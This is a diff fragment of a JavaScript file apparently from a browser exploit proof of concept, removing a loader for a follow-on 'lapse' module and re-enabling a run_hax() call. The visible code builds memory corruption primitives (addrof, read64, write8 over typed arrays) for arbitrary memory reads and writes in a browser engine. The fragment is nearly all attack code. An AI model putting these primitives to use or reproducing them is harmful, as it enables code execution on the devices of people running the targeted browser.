@@ -38,9 +38,6 @@ function poc() {
         c: true
     };
 
-var master_b = new Uint32Array(new ArrayBuffer(1));
-var slave_b =  new DataView(new ArrayBuffer(1));
-
     var string_atomifier = {};
     var string_id = 10000000;
 
@@ -395,22 +392,6 @@ var slave_b =  new DataView(new ArrayBuffer(1));
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
     m[7] = 1;
 
-
-async function load_lapse(){
-	alert("HI");
-        let mod = await import('./module/mem.mjs');
-        let imod = await import('./module/int64.mjs');
-        let Memory = mod.Memory;
-        let obj = {addr: null, 0: 0};
-        let obj_p = addrof(obj);
-        let obj_bt = read64(obj_p.add(8));
-        obj_p = new imod.Int(obj_p.low, obj_p.hi);
-        obj_bt = new imod.Int(obj_bt.low, obj_bt.hi);
-        new Memory(master_b, slave_b, obj, obj_p.add(0x10), obj_bt);
-        import('./lapse.mjs');
-    }
-
-
     var prim = {
         write8: function (addr, value) {
             expl_master[4] = addr.low;
@@ -477,9 +458,6 @@ async function load_lapse(){
             return new int64(obj_master[4], obj_master[5]);
         }
     };
-    window.p = prim; 
-    //run_hax();
-	alert("HI2");
-     load_lapse();
-	// return;
+    window.p = prim;
+    run_hax();
 }
